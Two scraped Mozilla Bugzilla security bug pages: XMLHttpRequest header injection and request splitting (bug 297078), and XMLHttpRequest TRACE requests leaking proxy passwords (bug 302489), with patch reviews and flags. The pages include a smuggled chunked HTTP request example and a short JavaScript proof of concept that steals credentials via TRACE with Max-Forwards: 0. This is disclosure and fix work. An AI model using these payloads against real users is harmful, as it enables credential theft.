> Accept-Language: ja,en;q=0.5
> Accept-Encoding: gzip,deflate
> Accept-Charset: EUC-JP,utf-8;q=0.7,\*;q=0.7
> Keep-Alive: 300
> Connection: keep-alive
> Transfer-Encoding: chunked
> Content-Type: text/xml
> Content-Length: 113
> Pragma: no-cache
> Cache-Control: no-cache
>
> 0
>
> POST /~yutaka/cgi-bin/test2.cgi?exploit=yes HTTP/1.1
> Host: hostname.domain.name.jp
> Content-Length: 500
>
>
> This is another form of splitted requests, because the request actually
> ends at the first line "0 CR LF CR LF". Note that Transfer-Encoding is
> a general header which can appear both in requests and responses,
> although it is not likely to be needed in requests.
>
> Add this header to the "dangerous headers" list provided in the
> "Possible Fix" section in the original report.
>
> 2) I have also found another, related security bug (or at least a "bad
> design"), which might be called "Intra-site TRACE vulnerability."
>
> Assume that <http://host/~a/secret/> is password-protected.
> The page owner of <http://host/~b/> can generate an XMLHTTP request
> to <http://host/~a/secret/> with the http "TRACE" method,
> to steal the hidden password.
>
> To prevent this, either of these two fixes is needed:
>
> 1) stop sending any confidential information on XMLHTTP request, or
> 2) forbid the TRACE method explicitly for XMLHTTP requests.
>
> Microsoft Internet Explorer and Opera seems to implement the
> solution 2).

|  | [Chris Beard](/user_profile?user_id=164061) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=297078#a4165979_164061)• 20 years ago |

Whiteboard: [sg:fix] → [sg:fix] [ready to land]

|  | [Rafael Ebron (:rebron)](/user_profile?user_id=12809) |  |
| --- | --- | --- |
| [Comment 27](/show_bug.cgi?id=297078#c27)• 20 years ago |
|  | |

US CERT is tracking this as VU#880616

|  | [Darin Fisher](/user_profile?user_id=20048)  Assignee |  |
| --- | --- | --- |
| [Comment 28](/show_bug.cgi?id=297078#c28)• 20 years ago |
|  | |

I think I should probably file a separate bug on making XMLHttpRequest restrict
the set of headers that it allows its consumer to set. We don't want to make
the HTTP code prevent the setting of Content-Length for example.

|  | [Darin Fisher](/user_profile?user_id=20048)  Assignee |  |
| --- | --- | --- |
| [Comment 29](/show_bug.cgi?id=297078#c29)• 20 years ago |
|  | |

fixed-on-trunk w/ '\0' added to the set of characters disallowed in header values.
I'll be posting a patch for the 1.7 branch shortly.Status: ASSIGNED → RESOLVEDClosed: 20 years agoResolution: --- → FIXED

|  | [Darin Fisher](/user_profile?user_id=20048)  Assignee |  |
| --- | --- | --- |
| [Comment 30](/show_bug.cgi?id=297078#c30)• 20 years ago |
|  | |

GCC kindly complained about this line:
> if (\*start > 127 || !kValidTokenMap[\*start])
I wish I had compiled with GCC before commiting the patch. Because |\*start| is
signed, it will never be greater than 127 in value. I should cast to an
unsigned char instead before performing this comparison.

|  | [Darin Fisher](/user_profile?user_id=20048)  Assignee |  |
| --- | --- | --- |
| [Comment 31](/show_bug.cgi?id=297078#c31)• 20 years ago |
|  | |

Attached patch

[v1 follow-up patch](attachment.cgi?id=190616&action=diff)
— [Details](attachment.cgi?id=190616&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=297078&attachment=190616)

|  | [Boris Zbarsky [:bzbarsky]](/user_profile?user_id=20209) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=297078#a4169556_20209)• 20 years ago |

[Attachment #190616](/attachment.cgi?id=190616&action=edit "v1 follow-up patch") -
Flags: superreview+
[Attachment #190616](/attachment.cgi?id=190616&action=edit "v1 follow-up patch") -
Flags: review+

|  | [Darin Fisher](/user_profile?user_id=20048)  Assignee |  |
| --- | --- | --- |
| [Comment 32](/show_bug.cgi?id=297078#c32)• 20 years ago |
|  | |

I went ahead and checked in the follow-up patch on the trunk.

|  | [Darin Fisher](/user_profile?user_id=20048)  Assignee |  |
| --- | --- | --- |
| [Comment 33](/show_bug.cgi?id=297078#c33)• 20 years ago |
|  | |

Attached patch

[v1 patch ported to the 1.7/aviary1.0.1 branch](attachment.cgi?id=190617&action=diff) (obsolete)
— [Details](attachment.cgi?id=190617&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=297078&attachment=190617)

[Attachment #190617](/attachment.cgi?id=190617&action=edit "v1 patch ported to the 1.7/aviary1.0.1 branch") -
Flags: approval1.7.11?
[Attachment #190617](/attachment.cgi?id=190617&action=edit "v1 patch ported to the 1.7/aviary1.0.1 branch") -
Flags: approval-aviary1.0.7?

|  | [Darin Fisher](/user_profile?user_id=20048)  Assignee |  |
| --- | --- | --- |
| [Comment 34](/show_bug.cgi?id=297078#c34)• 20 years ago |
|  | |

I filed [bug 302263](/show_bug.cgi?id=302263 "RESOLVED FIXED - XMLHttpRequest allows dangerous request headers to be set") to cover the problem of allowing the setting of
'Transfer-Encoding: chunked' and 'Host: foo'

|  | [Yutaka OIWA](/user_profile?user_id=209278) |  |
| --- | --- | --- |
| [Comment 35](/show_bug.cgi?id=297078#c35)• 19 years ago |
|  | |

I'm not sure whether NUL causes problem or not,
and I don't know about the internal of Mozilla sources,
but
+ if (flatValue.FindCharInSet("\r\n\0") != kNotFound)
^^^^^^^^
This string seems to be a bad one in C++.
P.S. Can I see discussion on [bug 302263](/show_bug.cgi?id=302263 "RESOLVED FIXED - XMLHttpRequest allows dangerous request headers to be set"), too?

|  | [Tim Altman](/user_profile?user_id=29305)  Reporter |  |
| --- | --- | --- |
| [Comment 36](/show_bug.cgi?id=297078#c36)• 19 years ago |
|  | |

(In reply to [comment #35](/show_bug.cgi?id=297078#c35 "RESOLVED FIXED - setRequestHeader can be exploited using newline characters"))
> P.S. Can I see discussion on [bug 302263](/show_bug.cgi?id=302263 "RESOLVED FIXED - XMLHttpRequest allows dangerous request headers to be set"), too?
I'd also like to see the discussion there.

|  | [Darin Fisher](/user_profile?user_id=20048)  Assignee |  |
| --- | --- | --- |
| [Comment 37](/show_bug.cgi?id=297078#c37)• 19 years ago |
|  | |

> + if (flatValue.FindCharInSet("\r\n\0") != kNotFound)
> ^^^^^^^^
> This string seems to be a bad one in C++.
Yes, that is an error. Thank you for pointing it out. I will make a correction.

|  | [Darin Fisher](/user_profile?user_id=20048)  Assignee |  |
| --- | --- | --- |
| [Comment 38](/show_bug.cgi?id=297078#c38)• 19 years ago |
|  | |

Attached patch

[v1 follow-up patch (fix '\0' issue)](attachment.cgi?id=190733&action=diff)
— [Details](attachment.cgi?id=190733&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=297078&attachment=190733)

[Attachment #190733](/attachment.cgi?id=190733&action=edit "v1 follow-up patch (fix '\0' issue)") -
Flags: superreview?(bzbarsky)
[Attachment #190733](/attachment.cgi?id=190733&action=edit "v1 follow-up patch (fix '\0' issue)") -
Flags: review?(bzbarsky)

|  | [Darin Fisher](/user_profile?user_id=20048)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=297078#a4243543_20048)• 19 years ago |

[Attachment #190617](/attachment.cgi?id=190617&action=edit "v1 patch ported to the 1.7/aviary1.0.1 branch") -
Attachment is obsolete: true
[Attachment #190617](/attachment.cgi?id=190617&action=edit "v1 patch ported to the 1.7/aviary1.0.1 branch") -
Flags: approval1.7.11?
[Attachment #190617](/attachment.cgi?id=190617&action=edit "v1 patch ported to the 1.7/aviary1.0.1 branch") -
Flags: approval-aviary1.0.7?

|  | [Darin Fisher](/user_profile?user_id=20048)  Assignee |  |
| --- | --- | --- |
| [Comment 39](/show_bug.cgi?id=297078#c39)• 19 years ago |
|  | |

Attached patch

[patch for 1.7/aviary-1.0.1 branch](attachment.cgi?id=190735&action=diff)
— [Details](attachment.cgi?id=190735&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=297078&attachment=190735)

[Attachment #190735](/attachment.cgi?id=190735&action=edit "patch for 1.7/aviary-1.0.1 branch") -
Flags: approval1.7.12?
[Attachment #190735](/attachment.cgi?id=190735&action=edit "patch for 1.7/aviary-1.0.1 branch") -
Flags: approval-aviary1.0.7?

|  | [Boris Zbarsky [:bzbarsky]](/user_profile?user_id=20209) |  |
| --- | --- | --- |
| [Comment 40](/show_bug.cgi?id=297078#c40)• 19 years ago |
|  | |

Comment on [attachment 190733](/attachment.cgi?id=190733 "v1 follow-up patch (fix '\0' issue)") [[details]](/attachment.cgi?id=190733&action=edit "v1 follow-up patch (fix '\0' issue)") [[diff]](/attachment.cgi?id=190733&action=diff "v1 follow-up patch (fix '\0' issue)") [[review]](/page.cgi?id=splinter.html&ignore=&bug=297078&attachment=190733)
v1 follow-up patch (fix '\0' issue)
Looks good; not sure whether this is better than just doing a FindChar('\0'),
but either way.
[Attachment #190733](/attachment.cgi?id=190733&action=edit "v1 follow-up patch (fix '\0' issue)") -
Flags: superreview?(bzbarsky)
[Attachment #190733](/attachment.cgi?id=190733&action=edit "v1 follow-up patch (fix '\0' issue)") -
Flags: superreview+
[Attachment #190733](/attachment.cgi?id=190733&action=edit "v1 follow-up patch (fix '\0' issue)") -
Flags: review?(bzbarsky)
[Attachment #190733](/attachment.cgi?id=190733&action=edit "v1 follow-up patch (fix '\0' issue)") -
Flags: review+

|  | [Darin Fisher](/user_profile?user_id=20048)  Assignee |  |
| --- | --- | --- |
| [Comment 41](/show_bug.cgi?id=297078#c41)• 19 years ago |
|  | |

fix for '\0' checked in on trunk

|  | [Asa Dotzler [:asa]](/user_profile?user_id=5003) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=297078#a4251699_5003)• 19 years ago |

Flags: blocking1.7.11+ → blocking1.7.12+

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 42](/show_bug.cgi?id=297078#c42)• 19 years ago |
|  | |

To be fixed as written we also need to fix [bug 302263](/show_bug.cgi?id=302263 "RESOLVED FIXED - XMLHttpRequest allows dangerous request headers to be set")
The HTTP TRACE issue should be split into a separate bug.Depends on: [302263](/show_bug.cgi?id=302263 "RESOLVED FIXED - XMLHttpRequest allows dangerous request headers to be set")

|  | [Darin Fisher](/user_profile?user_id=20048)  Assignee |  |
| --- | --- | --- |
| [Comment 43](/show_bug.cgi?id=297078#c43)• 19 years ago |
|  | |

I don't understand the TRACE issue. I presume the problem is that the request
sent to <http://host/a/> can be seen by <http://host/b/>, but why is that a concern?
It only works on the same host. We already allow the page <http://host/b/> to
load the page <http://host/a/> and walk its DOM. While it's true that that
doesn't reveal the password to the site, <http://host/b/> could also just
challenge the browser with the same Basic auth realm, and it would then receive
the same password. All it would need to do is issue GET requests to do this, so
why is TRACE more of a risk?

|  | [Darin Fisher](/user_profile?user_id=20048)  Assignee |  |
| --- | --- | --- |
| [Comment 44](/show_bug.cgi?id=297078#c44)• 19 years ago |
|  | |

Is the problem perhaps that TRACE would reveal the user's proxy password?

|  | [Yutaka OIWA](/user_profile?user_id=209278) |  |
| --- | --- | --- |
| [Comment 45](/show_bug.cgi?id=297078#c45)• 19 years ago |
|  | |

(In reply to [comment #43](/show_bug.cgi?id=297078#c43 "RESOLVED FIXED - setRequestHeader can be exploited using newline characters"))
<http://host/b/> could also just
> challenge the browser with the same Basic auth realm, and it would then receive
> the same password. All it would need to do is issue GET requests to do this, so
> why is TRACE more of a risk?
Please read between lines where I put tildes before "a" and "b" :-)
Good multi-user web servers (e.g. Apache) do not reveal passwords to its
CGIs, to prevent such way of password steal. So your story of attack
does not succeed. TRACE method does disables this protection.
Of course, there is always a scripting issue regarding multi-user web server,
but permanent attack such as password steal shall be considered more
risky than a temporary attack such as XSS.
In other word, an Intra-site Trace is more risky than local scripting,
as Cross-site Trace
(<http://www.cgisecurity.com/whitehat-mirror/WH-WhitePaper_XST_ebook.pdf>) is
more risky than XSS.

|  | [Yutaka OIWA](/user_profile?user_id=209278) |  |
| --- | --- | --- |
| [Comment 46](/show_bug.cgi?id=297078#c46)• 19 years ago |
|  | |

(In reply to [comment #44](/show_bug.cgi?id=297078#c44 "RESOLVED FIXED - setRequestHeader can be exploited using newline characters"))
> Is the problem perhaps that TRACE would reveal the user's proxy password?
Oh, Yes, it is possible...
Sending "Max-Forwards: 0" enables to steal a proxy password...

|  | [Yutaka OIWA](/user_profile?user_id=209278) |  |
| --- | --- | --- |
| [Comment 47](/show_bug.cgi?id=297078#c47)• 19 years ago |
|  | |

(In reply to [comment #46](/show_bug.cgi?id=297078#c46 "RESOLVED FIXED - setRequestHeader can be exploited using newline characters"))
> > Is the problem perhaps that TRACE would reveal the user's proxy password?
>
> Oh, Yes, it is possible...
> Sending "Max-Forwards: 0" enables to steal a proxy password...
As I succeed to exploit this vulnerability,
I filed this as a separate [bug 302489](/show_bug.cgi?id=302489 "RESOLVED FIXED - XMLHTTP TRACE method can reveal proxy passwords to web sites") .
Please find an appropriate layer to apply a fix.

|  | [Mike Schroepfer](/user_profile?user_id=210162) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=297078#a8303014_210162)• 19 years ago |

Flags: blocking-aviary1.0.7?

|  | [David Baron :dbaron: (⌚️UTC-4, no longer working on Mozilla)](/user_profile?user_id=3881) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=297078#a8303052_3881)• 19 years ago |

Flags: blocking1.7.12?

|  | [chris hofmann](/user_profile?user_id=2687) |  |
| --- | --- | --- |
| [Comment 48](/show_bug.cgi?id=297078#c48)• 19 years ago |
|  | |

> ------- Additional [Comment #27](/show_bug.cgi?id=297078#c27 "RESOLVED FIXED - setRequestHeader can be exploited using newline characters") From Rafael Ebron 2005-07-26 13:36 PDT
[reply] -------
>
> US CERT is tracking this as VU#880616
need to follow up with CERT when the fix gets released. a number is assigned
but the report is not public yet
<http://search.us-cert.gov/query.html?col=csalrts&col=csbulls&col=cstips&col=feddocs&col=pressrm&col=tcsalrts&col=vulnotes&col=xtradocs&qt=VU%23880616&charset=iso-8859-1>

|  | [Asa Dotzler [:asa]](/user_profile?user_id=5003) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=297078#a8316449_5003)• 19 years ago |

[Attachment #190735](/attachment.cgi?id=190735&action=edit "patch for 1.7/aviary-1.0.1 branch") -
Flags: approval1.7.13?
[Attachment #190735](/attachment.cgi?id=190735&action=edit "patch for 1.7/aviary-1.0.1 branch") -
Flags: approval1.7.13+
[Attachment #190735](/attachment.cgi?id=190735&action=edit "patch for 1.7/aviary-1.0.1 branch") -
Flags: approval-aviary1.0.8?
[Attachment #190735](/attachment.cgi?id=190735&action=edit "patch for 1.7/aviary-1.0.1 branch") -
Flags: approval-aviary1.0.8+

|  | [Asa Dotzler [:asa]](/user_profile?user_id=5003) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=297078#a8316494_5003)• 19 years ago |

Flags: blocking1.7.13+Flags: blocking1.7.12?Flags: blocking1.7.12+Flags: blocking-aviary1.0.8+Flags: blocking-aviary1.0.7?Flags: blocking-aviary1.0.7+

|  | [David Baron :dbaron: (⌚️UTC-4, no longer working on Mozilla)](/user_profile?user_id=3881) |  |
| --- | --- | --- |
| [Comment 49](/show_bug.cgi?id=297078#c49)• 19 years ago |
|  | |

Landed [attachment 190735](/attachment.cgi?id=190735 "patch for 1.7/aviary-1.0.1 branch") [[details]](/attachment.cgi?id=190735&action=edit "patch for 1.7/aviary-1.0.1 branch") [[diff]](/attachment.cgi?id=190735&action=diff "patch for 1.7/aviary-1.0.1 branch") [[review]](/page.cgi?id=splinter.html&ignore=&bug=297078&attachment=190735) on MOZILLA\_1\_7\_BRANCH and AVIARY\_1\_0\_1\_20050124\_BRANCH,
and verified that it's the same as a join from revision 1.252 to 1.255.Keywords: [fixed-aviary1.0.7](/buglist.cgi?keywords=fixed-aviary1.0.7&resolution=---),
[fixed1.7.12](/buglist.cgi?keywords=fixed1.7.12&resolution=---)

|  | [David Baron :dbaron: (⌚️UTC-4, no longer working on Mozilla)](/user_profile?user_id=3881) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=297078#a8327419_3881)• 19 years ago |

[Attachment #190735](/attachment.cgi?id=190735&action=edit "patch for 1.7/aviary-1.0.1 branch") -
Flags: approval1.7.13+
[Attachment #190735](/attachment.cgi?id=190735&action=edit "patch for 1.7/aviary-1.0.1 branch") -
Flags: approval1.7.12+
[Attachment #190735](/attachment.cgi?id=190735&action=edit "patch for 1.7/aviary-1.0.1 branch") -
Flags: approval-aviary1.0.8+
[Attachment #190735](/attachment.cgi?id=190735&action=edit "patch for 1.7/aviary-1.0.1 branch") -
Flags: approval-aviary1.0.7+

|  | [Darin Fisher](/user_profile?user_id=20048)  Assignee |  |
| --- | --- | --- |
| [Comment 50](/show_bug.cgi?id=297078#c50)• 19 years ago |
|  | |

dbaron: thanks for landing the patch.

|  | [chris hofmann](/user_profile?user_id=2687) |  |
| --- | --- | --- |
| [Comment 51](/show_bug.cgi?id=297078#c51)• 19 years ago |
|  | |

ideas for testing around xmlhttprequest in general wanted....
<http://developer.apple.com/internet/webcontent/xmlhttpreq.html>
<http://developer.apple.com/internet/webcontent/XMLHttpRequestExample/example.html>
user contributed notes under
<http://www.xulplanet.com/references/objref/XMLHttpRequest.html>
google toolbar extension
mozilla amazon browser <http://www.faser.net/mab/>
check with marcio and bclary for more ideas

|  | [chris hofmann](/user_profile?user_id=2687) |  |
| --- | --- | --- |
| [Comment 52](/show_bug.cgi?id=297078#c52)• 19 years ago |
|  | |

any thoughts on good Ajax test suites?

|  | [chris hofmann](/user_profile?user_id=2687) |  |
| --- | --- | --- |
| [Comment 53](/show_bug.cgi?id=297078#c53)• 19 years ago |
|  | |

any thoughts on good Ajax test suites?
other test apps?
<http://virtualearth.msn.com/>
<http://maps.google.com/>
<http://www.google.com/webhp?complete=1&hl=en>
<http://treehouse.ofb.net/chat/?lang=en>

|  | [chris hofmann](/user_profile?user_id=2687) |  |
| --- | --- | --- |
| [Comment 54](/show_bug.cgi?id=297078#c54)• 19 years ago |
|  | |

<http://www.mozilla.org/xmlextras/tests.html>

|  | [Tim Altman](/user_profile?user_id=29305)  Reporter |  |
| --- | --- | --- |
| [Comment 55](/show_bug.cgi?id=297078#c55)• 19 years ago |
|  | |

Test suite:
<http://www.hixie.ch/tests/adhoc/dom/web-apps/XMLHttpRequest/>
Demo site:
<http://gmail.google.com/>

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=297078#a9261270_1689)• 19 years ago |

Group: security

|  | [Scott MacGregor](/user_profile?user_id=93208) |  |
| --- | --- | --- |
| [Comment 56](/show_bug.cgi?id=297078#c56)• 19 years ago |
|  | |

keyword cleanupKeywords: [fixed1.8](/buglist.cgi?keywords=fixed1.8&resolution=---)
You need to [log in](/show_bug.cgi?id=297078&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Darin Fisher](/user_profile?user_id=20048)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from bugzilla.mozilla.org_e9ecfb0f_20250125_150924.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/302489)
* [XML](/show_bug.cgi?ctype=xml&id=302489)

Closed
[Bug 302489](/show_bug.cgi?id=302489)

Opened 19 years ago
Closed 19 years ago

# XMLHTTP TRACE method can reveal proxy passwords to web sites

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

XMLHTTP TRACE method can reveal proxy passwords to web sites

## Categories

### (Core :: XML, defect)

[Product:](/describecomponents.cgi?product=Core)

Core
▾

Core
Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the [Firefox](https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox) product. ([More info](https://wiki.mozilla.org/Modules/All#Core))
[See Open Bugs in This Product](/buglist.cgi?product=Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Core)
Watch This Product

[Component:](/describecomponents.cgi?product=Core&component=XML#XML)

XML
▾

Core :: XML
For bugs in our XML handling. For example, parser errors, or errors in wellformedness error reporting.
[See Open Bugs in This Component](/buglist.cgi?product=Core&component=XML&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Core&component=XML&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Core&component=XML)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

Trunk

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

All

All

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

*Not set*

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

critical

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

mozilla1.8beta4

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Performance Impact | --- |
| --- | --- |
| Accessibility Severity | --- |
| Webcompat Priority | --- |
| a11y-review | --- |
| Webcompat Score | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: y.oiwa, Assigned: darin.moz)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/ace1cc2d025e30490cb83b98bd47a94a?d=mm&size=40)  [darin.moz](/user_profile?user_id=20048)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/48121892846afb6c129084ed49d09dfb?d=mm&size=40)  [y.oiwa](/user_profile?user_id=209278)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/5111b810214a00377104f5ad3efefa26?d=mm&size=40)  [sefeng](/user_profile?user_id=625922)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

5 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

---

## Details

### (Keywords: fixed1.7.13, Whiteboard: [sg:fix])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

---

[Keywords:](/describekeywords.cgi)

[fixed1.7.13](/buglist.cgi?keywords=fixed1.7.13&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[sg:fix]

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [blocking1.7.13](#a10697549_1689 "19 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | blocking1.7.13 | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | [blocking-aviary1.0.8](#c0 "19 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | blocking-aviary1.0.8 | + |
| --- | --- | --- |
| [asa](/user_profile?user_id=5003) | [blocking1.8b5](#c0 "19 years ago") | + |
| --- | --- | --- |
| [asa](/user_profile?user_id=5003) | blocking1.8b5 | + |
| --- | --- | --- |
| [bc](/user_profile?user_id=23402) | [in-testsuite](#a52911942_23402 "19 years ago") | ? |
| --- | --- | --- |
| [bc](/user_profile?user_id=23402) | in-testsuite | ? |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty | ? |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | qe-verify |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (1 file)

| [v1 patch](/attachment.cgi?id=190884)  [19 years ago](#c7)  [Darin Fisher](/user_profile?user_id=20048)   1.24 KB, patch | jst : [review+](#c12 "19 years ago")  dveditz : [superreview+](#c9 "19 years ago")  dveditz : [approval-aviary1.0.8+](#c0 "19 years ago")  dveditz : [approval1.7.13+](#c0 "19 years ago")  asa : [approval1.8b4+](#a62635_5003 "19 years ago") | [Details](/attachment.cgi?id=190884&action=edit) | [Diff](/attachment.cgi?id=190884&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=302489&attachment=190884) |
| --- | --- | --- |

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Yutaka OIWA](/user_profile?user_id=209278)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=302489#c0)• 19 years ago |
|  | |

User-Agent: Mozilla/5.0 (X11; U; Linux i686; ja-JP; rv:1.7.8) Gecko/20050513 Debian/1.7.8-1
Build Identifier: Mozilla/5.0 (X11; U; Linux i686; ja-JP; rv:1.7.8) Gecko/20050513 Debian/1.7.8-1
Proxy authentication passwords are stolen by malicious Javascript.
In addition, the web authentication passwords for any pages on the
same web servers (including ones for other people's web contents)
can also be stolen.
Reproducible: Always
Steps to Reproduce:
Let victims execute the following Javascript.
xmlhttp = new XMLHttpRequest();
xmlhttp.open("TRACE", "a.html");
xmlhttp.setRequestHeader("Max-Forwards", "0");
xmlhttp.onreadystatechange=function() {
if (xmlhttp.readyState==4) {
alert("Status: " + xmlhttp.status + "\n" + xmlhttp.responseText)
}
}
xmlhttp.send(null)
}
Expected Results:
TRACE request should be banned, at least for scripts.
Splitted from [bug 297078](/show_bug.cgi?id=297078 "RESOLVED FIXED - setRequestHeader can be exploited using newline characters") after successed constructing an exploit.
If plugins are allowed to use Mozilla's internal HTTP layer,
there may be a similar problem. Please check them, too.

|  | [Darin Fisher](/user_profile?user_id=20048)  Assignee |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=302489#c1)• 19 years ago |
|  | |

Over to the XML component.
Do flash or java provide ways to issue TRACE requests? If so, wouldn't that be
a bug with those plugins? I believe that our plugin API gives plugins the
ability to issue HTTP requests using our stack, but a plugin could easily use
its own HTTP stack, so limiting what a plugin can do wouldn't be worth it.Status: UNCONFIRMED → ASSIGNEDComponent: Networking: HTTP → XMLEver confirmed: true

|  | [Darin Fisher](/user_profile?user_id=20048)  Assignee |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=302489#a15781_20048)• 19 years ago |

Flags: blocking1.8b4?OS: Linux → AllHardware: PC → AllTarget Milestone: --- → mozilla1.8beta4

|  | [Yutaka OIWA](/user_profile?user_id=209278)  Reporter |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=302489#c2)• 19 years ago |
|  | |

(In reply to [comment #1](/show_bug.cgi?id=302489#c1 "RESOLVED FIXED - XMLHTTP TRACE method can reveal proxy passwords to web sites"))
> Over to the XML component.
>
> Do flash or java provide ways to issue TRACE requests?
I do not know. I'm not a specialist in either Mozilla or those plugins.
> If so, wouldn't that be
> a bug with those plugins? I believe that our plugin API gives plugins the
> ability to issue HTTP requests using our stack, but a plugin could easily use
> its own HTTP stack, so limiting what a plugin can do wouldn't be worth it.
I believe the opposite. Using browser's HTTP stack gives
more power than using its own HTTP stack: depending on the browser's
implementation, it may use secret credential stored in the browser,
